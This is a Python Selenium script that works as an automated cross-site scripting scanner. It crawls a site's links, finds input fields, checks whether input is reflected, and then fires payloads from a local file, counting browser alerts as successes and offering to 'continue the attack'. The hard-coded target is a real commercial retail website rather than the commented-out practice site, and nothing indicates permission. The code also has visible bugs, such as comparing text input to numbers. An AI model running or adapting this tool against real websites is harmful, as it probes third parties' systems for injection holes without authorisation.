import selenium
from selenium import webdriver
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import NoAlertPresentException

profile = webdriver.FirefoxProfile('/home/fake_batman_/.mozilla/firefox/x2n55od1.default')
webdriver.DesiredCapabilities.FIREFOX["unexpectedAlertBehaviour"] = "accept"
driver = webdriver.Firefox(firefox_profile=profile)
list_of_input_tags = []
list_of_urls = []
destination_url = 'https://www.woodlandworldwide.com/'


def spidering(driver, url):
    driver.get(url)
    html_page = driver.page_source
    while html_page.find('<a') != -1:
        anchor_tag = html_page[html_page.find('<a'): html_page.find('>', html_page.find('<a') + 1)]
        anchor_tag = anchor_tag[anchor_tag.find("href"):]
        anchor_tag = anchor_tag[anchor_tag.find("\"") + 1:]
        anchor_tag = anchor_tag[:anchor_tag.find("\n")]
        if anchor_tag.find('www') == -1 and anchor_tag.find('http') == -1 and anchor_tag.find(";") == -1 \
                and anchor_tag.find("#") == -1 and anchor_tag.find(":") == -1:
            if anchor_tag.find('.') or anchor_tag.find('/'):
                list_of_urls.append(anchor_tag)
                print(anchor_tag)
        html_page = html_page[html_page.find('<a') + 1:]


def XSS_checker(url, list_of_names_, button_name, id_name_counter):
    with open("payloads") as file:
        payloads = file.read().split("\n")
    number = 0
    success = 0
    for payload in payloads:
        driver.get(url)
        try:
            for mName in list_of_names_:
                if id_name_counter == 1:
                    name_field = driver.find_element_by_id(mName)
                else:
                    name_field = driver.find_element_by_name(mName)
                if driver.current_url == destination_url:
                    driver.find_element_by_xpath('/html/body/nav/div/form/div').click()
                name_field.send_keys(payload)
            if id_name_counter == 1:
                button_field = driver.find_element_by_id(button_name)
            else:
                button_field = driver.find_element_by_name(button_name)
            button_field.click()
            number += 1
            if number % 10 == 0 and success == 1:
                go_ahead = input("********This website is vulnerable to XSS*******\n"
                                 "1. To continue the attack on this same page.\n"
                                 "2. To go other directories.\n"
                                 "3. Leave this web page and exit.\n"
                                 "Enter your input here: ").lower()
                if go_ahead == 1:
                    return 1
                elif go_ahead == 2:
                    return 2
                elif go_ahead == 3:
                    driver.close()
                    exit(1)
            try:
                driver.switch_to.alert.accept()
                print("Payload number: {}\tStatus: {}".format(number, "Success"))
                success = 1
            except NoAlertPresentException:
                print("Payload number: {}\tStatus: {}".format(number, "Not success"))
        except Exception:
            continue


def input_finder(driver, url):
    driver.get(url)
    html = driver.page_source
    input_counter = 0
    text_counter = 0
    button_counter = 0
    id_name_counter = 0
    reflected_counter = 0
    driver.get(url)
    html = driver.page_source
    reflected_tester = "I am batman"
    while True:
        if html.find('<input') != -1:
            input_tags = html[html.find('<input'): html.find('>', html.find('<input') + 1)]
            if input_tags.find("search") != -1 and input_tags.find("text") != -1:
                search_id = input_tags.find("name")
                search_text = input_tags[search_id:]
                id = search_text[search_text.find("\"") + 1:]
                id = id[:id.find("\"")]
                if id == '':
                    id_name_counter = 1
                if id_name_counter == 1:
                    search_id = input_tags.find("id")
                    search_text = input_tags[search_id:]
                    id = search_text[search_text.find("\"") + 1:]
                    id = id[:id.find("\"")]
                list_of_input_tags.append([input_counter, 'search', id, button_counter])
                button_counter = 0
                text_counter += 1
                input_counter += 1
                print("Search field found...")
            elif input_tags.find("text") != -1:
                text_id = input_tags.find("name")
                field_text = input_tags[text_id:]
                id = field_text[field_text.find("\"") + 1:]
                id = id[:id.find("\"")]
                if id == '':
                    id_name_counter = 1
                if id_name_counter == 1:
                    search_id = input_tags.find("id")
                    search_text = input_tags[search_id:]
                    id = search_text[search_text.find("\"") + 1:]
                    id = id[:id.find("\"")]
                list_of_input_tags.append([input_counter, 'text', id, button_counter])
                button_counter = 0
                text_counter += 1
                input_counter += 1
                print("Text field found...")
            elif input_tags.find("button") != -1 and input_tags.find("clear") != -1:
                continue
            elif input_tags.find("button") != -1 or input_tags.find("submit") != -1:
                button_id = input_tags.find("name")
                button_text = input_tags[button_id:]
                id = button_text[button_text.find("\"") + 1:]
                id = id[:id.find("\"")]
                if id == '':
                    id_name_counter = 1
                if id_name_counter == 1:
                    search_id = input_tags.find("id")
                    search_text = input_tags[search_id:]
                    id = search_text[search_text.find("\"") + 1:]
                    id = id[:id.find("\"")]
                list_of_input_tags.append([input_counter, 'button', id, text_counter])
                button_counter += 1
                text_counter = 0
                input_counter += 1
                print("Button field found...")
            html = html[html.find('<input') + 1:]
        else:
            if input_counter == 0:
                print("No input fields found!")
            break
    print(list_of_input_tags)
    counter_www = 0
    text_field_counter = 0
    list_of_names = []
    for input_tag in list_of_input_tags:
        if input_tag[1] == 'search' or input_tag[1] == 'text':
            id = input_tag[0]
            name = input_tag[2]
            if id_name_counter == 1:
                nameField = driver.find_element_by_id(name)
            else:
                nameField = driver.find_element_by_name(name)
            text_field_counter += 1
            if driver.current_url == destination_url and counter_www == 0:
                driver.find_element_by_xpath('/html/body/nav/div/form/div').click()
                counter_www = 1
            nameField.send_keys(reflected_tester)
            list_of_names.append(name)
        elif input_tag[1] == 'button':
            name = input_tag[2]
            if id_name_counter == 1:
                buttonField = driver.find_element_by_id(name)
            else:
                buttonField = driver.find_element_by_name(name)
            if text_field_counter == input_tag[3]:
                text_field_counter = 0
                buttonField.click()
                if driver.page_source.find(reflected_tester) != -1:
                    print("The value has been reflected...")
                    # Check for XSS
                    reflected_counter = 1
                    if XSS_checker(url, list_of_names, name, id_name_counter) == 2:
                        return True
                    elif XSS_checker(url, list_of_names, name, id_name_counter) == 1:
                        list_of_names.clear()
                        continue
                else:
                    driver.get(url)
            else:
                print("Wrong button please check...")





def main():
    url = 'https://www.woodlandworldwide.com'
    # url = 'http://testphp.vulnweb.com'
    spidering(driver, url)
    for path in list_of_urls:
        updated_url = url
        if path[0] != '/':
            url += '/' + path
        else:
            url += path
        input_finder(driver, url)
main()